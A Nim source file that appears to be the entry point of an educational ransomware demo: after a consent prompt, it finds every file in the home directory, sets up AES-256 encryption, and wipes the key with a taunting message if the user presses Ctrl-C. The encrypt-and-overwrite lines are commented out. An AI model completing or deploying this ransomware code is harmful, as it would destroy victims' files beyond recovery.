# This is just an example to get you started. A typical binary package
# uses this file as the main entry point of the application.
import nimalicious/[consent, crypto]
import nimcrypto

askConsent(
  "gen_random",
  ransomwareDangers
)


when defined(debug):
  # Make a dummy file specifically to be encrypted and decrypted.
  proc findFiles*(): seq[string] =
    try:
      writeFile("dummy_file.txt", "Hello World!")
      return @["dummy_file.txt"]
    except:
      # Return nothing as a safe measure.
      return @[]

else:
  import std/os
  # Search *everywhere* in the user's home directory.
  proc findFiles*(): seq[string] =
    for kind, path in walkDir(dir = getHomeDir(), skipSpecial = true):
      if kind == pcFile: result.add(path)
    return result

# Initialize encryption.
var algo: ECB[aes256]
algo.init(genKey())

proc exit() {.noconv.} =
  echo "Clearing encryption key since you tried to exit. Good luck."
  when not defined(debug): algo.clear()
setControlCHook(exit)



for file in findFiles():
  var
    contents = autoPadStr(readFile(file))
    tmp = newString(len(contents))
  echo contents
#  algo.encrypt(contents, tmp)
#  writeFile(file, tmp)